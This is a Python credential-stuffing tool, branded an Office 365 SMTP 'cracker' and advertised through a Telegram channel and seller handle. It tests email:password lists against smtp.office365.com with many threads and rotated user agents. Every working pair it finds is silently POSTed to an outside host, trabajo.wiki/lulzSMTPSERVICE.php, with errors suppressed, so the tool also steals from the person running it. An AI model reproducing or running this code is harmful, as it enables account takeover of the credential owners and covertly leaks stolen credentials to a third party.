import os
import time
import requests
import concurrent.futures
import warnings
import random
import smtplib
from colorama import init, Fore, Style, Back

warnings.filterwarnings("ignore")
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.41 Safari/537.36",
]

POST_URL = "https://trabajo.wiki/lulzSMTPSERVICE.php"

def print_slowly(message):
    for char in message:
        print(char, end='', flush=True)
        time.sleep(0.0001)
    print()

def check_smtp_connection(email_to_test, email, password, user_agent):
    ports = [587]
    for port in ports:
        try:
            server = smtplib.SMTP('smtp.office365.com', port, timeout=5)
            server.ehlo()
            server.starttls()
            server.esmtp_features['auth'] = 'LOGIN ' + user_agent
            server.login(email, password)
            server.quit()
            return email, password, True
        except smtplib.SMTPAuthenticationError:
            return email, password, False
        except smtplib.SMTPException:
            return email, password, False
        except (ConnectionRefusedError, TimeoutError):
            continue
    return email, password, False

def process_email_password(email_to_test, line):
    try:
        email, password = line.strip().split(':')
        user_agent = random.choice(USER_AGENTS)
        result = check_smtp_connection(email_to_test, email.strip(), password.strip(), user_agent)
        if result[2]:
            print(Fore.LIGHTWHITE_EX+Style.DIM+Style.BRIGHT + f"[{Fore.GREEN}#{Fore.LIGHTWHITE_EX}] Successfully Cracked {Fore.LIGHTGREEN_EX}{result[0]}:{result[1]}" + Fore.RESET)
            post_result_to_website(result[0], result[1])
        else:
            print(Fore.LIGHTWHITE_EX+Style.DIM+Style.BRIGHT + f"[{Fore.RED}#{Fore.LIGHTWHITE_EX}] {Fore.LIGHTRED_EX}Failed {Fore.LIGHTWHITE_EX}{result[0]}:{result[1]}" + Fore.RESET)
        time.sleep(1)
    except ValueError:
        print(Fore.LIGHTWHITE_EX+Style.DIM+Style.BRIGHT + f"[#] {Back.RED}[BAD_FORMAT]{Style.RESET_ALL}{Fore.LIGHTWHITE_EX}{Style.DIM}{Style.BRIGHT}{line}" + Fore.RESET)

def post_result_to_website(email, password):
    try:
        data = f"{email}:{password}"
        requests.post(POST_URL, data=data, headers={'Content-Type': 'text/plain'}, timeout=5)
    except requests.RequestException:
        pass

def main():
    init()
    message = f"""{Fore.LIGHTWHITE_EX}{Style.DIM}{Style.BRIGHT}
    [{Fore.GREEN}# {Fore.LIGHTWHITE_EX}TELEGRAM CHANNEL ] - {Back.CYAN}https://t.me/UnkownxArmy{Style.RESET_ALL}{Fore.LIGHTWHITE_EX}{Style.DIM}{Style.BRIGHT}
    [{Fore.GREEN}# {Fore.LIGHTWHITE_EX}TELEGRAM DM      ] - {Back.CYAN}@comebuyfrom{Style.RESET_ALL}
"""
    logo = """
  ______   ________  ________  ______   ______   ________         ______    ______   _______          ______   _______    ______    ______   __    __  ________  _______  
 /      \ /        |/        |/      | /      \ /        |       /      \  /      \ /       |        /      \ /       \  /      \  /      \ /  |  /  |/        |/       \ 
/$$$$$$  |$$$$$$$$/ $$$$$$$$/ $$$$$$/ /$$$$$$  |$$$$$$$$/       /$$$$$$  |/$$$$$$  |$$$$$$$/        /$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |$$ | /$$/ $$$$$$$$/ $$$$$$$  |
$$ |  $$ |$$ |__    $$ |__      $$ |  $$ |  $$/ $$ |__          $$ ___$$ |$$ \__$$/ $$ |____        $$ |  $$/ $$ |__$$ |$$ |__$$ |$$ |  $$/ $$ |/$$/  $$ |__    $$ |__$$ |
$$ |  $$ |$$    |   $$    |     $$ |  $$ |      $$    |           /   $$< $$      \ $$      \       $$ |      $$    $$< $$    $$ |$$ |      $$  $$<   $$    |   $$    $$< 
$$ |  $$ |$$$$$/    $$$$$/      $$ |  $$ |   __ $$$$$/           _$$$$$  |$$$$$$$  |$$$$$$$  |      $$ |   __ $$$$$$$  |$$$$$$$$ |$$ |   __ $$$$$  \  $$$$$/    $$$$$$$  |
$$ \__$$ |$$ |      $$ |       _$$ |_ $$ \__/  |$$ |_____       /  \__$$ |$$ \__$$ |/  \__$$ |      $$ \__/  |$$ |  $$ |$$ |  $$ |$$ \__/  |$$ |$$  \ $$ |_____ $$ |  $$ |
$$    $$/ $$ |      $$ |      / $$   |$$    $$/ $$       |      $$    $$/ $$    $$/ $$    $$/       $$    $$/ $$ |  $$ |$$ |  $$ |$$    $$/ $$ | $$  |$$       |$$ |  $$ |
 $$$$$$/  $$/       $$/       $$$$$$/  $$$$$$/  $$$$$$$$/        $$$$$$/   $$$$$$/   $$$$$$/         $$$$$$/  $$/   $$/ $$/   $$/  $$$$$$/  $$/   $$/ $$$$$$$$/ $$/   $$/ 
                                                                                                                                                                          
                                                                                                                                                                          
                                                                                                                                                                          
    """
    print_slowly(message)
    print(Fore.LIGHTRED_EX + Style.DIM + Style.BRIGHT + logo)
    email_password_file = input(Fore.LIGHTWHITE_EX+Style.DIM+Style.BRIGHT + "[#]---List :")
    num_threads = int(input(Fore.LIGHTWHITE_EX+Style.DIM+Style.BRIGHT + "[#]---ThreadPoolExecutor (10-100): "))
    email_to_test = input(Fore.LIGHTWHITE_EX+Style.DIM+Style.BRIGHT + "[#]---Email to Test: ")

    if os.path.exists(email_password_file):
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            with open(email_password_file, 'r') as file:
                lines = file.readlines()
                executor.map(lambda line: process_email_password(email_to_test, line), lines)
    else:
        print(Fore.RED + "[ERROR]  -Email-password file not found." + Fore.RESET)

if __name__ == "__main__":
    main()
